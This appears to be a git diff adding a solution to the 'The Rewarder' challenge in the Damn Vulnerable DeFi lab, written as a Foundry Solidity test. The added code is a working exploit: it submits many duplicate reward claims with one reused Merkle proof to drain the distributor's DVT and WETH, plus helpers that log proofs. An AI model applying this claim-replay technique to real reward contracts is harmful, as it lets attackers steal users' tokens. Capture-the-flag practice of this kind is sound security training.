@@ -7,6 +7,7 @@ import {Merkle} from "murky/Merkle.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract TheRewarderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -19,8 +20,8 @@ contract TheRewarderChallenge is Test {
     uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;
 
     // Alice is the address at index 2 in the distribution files
-    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
-    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;
+    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809; // 0.25 DVT
+    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225; // 0.02284 WETH
 
     TheRewarderDistributor distributor;
 
@@ -148,7 +149,46 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);
+
+        uint256 distrDvtBalance = dvt.balanceOf(address(distributor));
+        uint256 distrWethBalance = weth.balanceOf(address(distributor));
+
+        uint256 dvtClaimAmount = 11524763827831882;
+        uint256 wethClaimAmount = 1171088749244340;
+        uint256 dvtClaimsCount = distrDvtBalance / dvtClaimAmount;
+        uint256 wethClaimsCount = distrWethBalance / wethClaimAmount;
+        IERC20[] memory dvtToClaim = new IERC20[](dvtClaimsCount);
+        Claim[] memory dvtClaims = new Claim[](dvtClaimsCount);
+
+        IERC20[] memory wethToClaim = new IERC20[](wethClaimsCount);
+        Claim[] memory wethClaims = new Claim[](wethClaimsCount);
+
+        for (uint256 i = 0; i < dvtClaimsCount; i++) {
+            dvtToClaim[i] = IERC20(address(dvt));
+
+            dvtClaims[i] = Claim({batchNumber: 0, amount: dvtClaimAmount, tokenIndex: i, proof: dvtProof});
+        }
+
+        for (uint256 i = 0; i < wethClaimsCount; i++) {
+            wethToClaim[i] = IERC20(address(weth));
+
+            wethClaims[i] = Claim({batchNumber: 0, amount: wethClaimAmount, tokenIndex: i, proof: wethProof});
+        }
+
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: dvtToClaim});
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: wethToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
+        console.log("distributor DVT: ", dvt.balanceOf(address(distributor)));
+        console.log("recovery DVT: ", dvt.balanceOf(address(recovery)));
+        console.log("distributor WETH: ", weth.balanceOf(address(distributor)));
+        console.log("recovery WETH: ", weth.balanceOf(address(recovery)));
     }
 
     /**
@@ -186,6 +226,51 @@ contract TheRewarderChallenge is Test {
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+        }
+    }
+
+    // ############ ADDED HELPERS BY ME #############
+
+    function test_countRewards() external view returns (uint256) {
+        string memory pathDvt = "/test/the-rewarder/dvt-distribution.json";
+        string memory pathWeth = "/test/the-rewarder/weth-distribution.json";
+
+        Reward[] memory rewardsDvt =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), pathDvt))), (Reward[]));
+        assertEq(rewardsDvt.length, BENEFICIARIES_AMOUNT);
+
+        Reward[] memory rewardsWeth =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), pathWeth))), (Reward[]));
+        assertEq(rewardsDvt.length, BENEFICIARIES_AMOUNT);
+
+        uint256 totalDvtAmount;
+        uint256 totalWethAmount;
+
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (rewardsDvt[i].beneficiary == player) console.log("Player DVT: ", rewardsDvt[i].amount, "index: ", i);
+            if (rewardsWeth[i].beneficiary == player) console.log("Player WETH: ", rewardsWeth[i].amount, "index: ", i);
+
+            totalDvtAmount += rewardsDvt[i].amount;
+            totalWethAmount += rewardsWeth[i].amount;
+        }
+
+        console.log("Expected DVT: ", TOTAL_DVT_DISTRIBUTION_AMOUNT);
+        console.log("Expected WETH: ", TOTAL_WETH_DISTRIBUTION_AMOUNT);
+        console.log("Total DVT: ", totalDvtAmount);
+        console.log("Total WETH: ", totalWethAmount);
+    }
+
+    function test_getPlayerProofs() external {
+        bytes32[] memory dvtProof = merkle.getProof(_loadRewards("/test/the-rewarder/dvt-distribution.json"), 188);
+        bytes32[] memory wethProof = merkle.getProof(_loadRewards("/test/the-rewarder/weth-distribution.json"), 188);
+
+        for (uint256 i; i < dvtProof.length; ++i) {
+            console.log("DVT proof for index ", i);
+            console.logBytes32(dvtProof[i]);
+        }
+        for (uint256 i; i < wethProof.length; ++i) {
+            console.log("WETH proof for index ", i);
+            console.logBytes32(wethProof[i]);
         }
     }
 }
